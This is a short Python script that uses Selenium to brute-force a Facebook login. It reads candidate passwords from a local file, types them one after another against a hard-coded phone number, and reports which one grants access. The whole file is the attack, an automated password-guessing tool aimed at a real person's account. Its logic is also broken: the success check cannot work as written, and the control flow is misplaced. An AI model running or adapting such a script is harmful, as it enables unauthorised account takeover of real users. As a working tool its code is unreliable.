import webbrowser
from selenium import webdriver
from selenium.webdriver.common.by import By
browser = webdriver.Firefox(executable_path="geckodriver.exe")
file = open("pass.txt")
passwd = file.read().splitlines()
for x in passwd :
    print("reading ",x)
    browser.get("https://www.facebook.com/")
    browser.find_element(By.NAME, "email").send_keys(8653796431)
    browser.find_element(By.NAME, "pass").send_keys(x)
    browser.find_element(By.NAME, "login").click()
    if browser.get("https://www.facebook.com/mobileprotection?source=mobile_mirror_nux"):
     print("failed",x)
     browser.close()
else :
 print("access granted password is ",x)
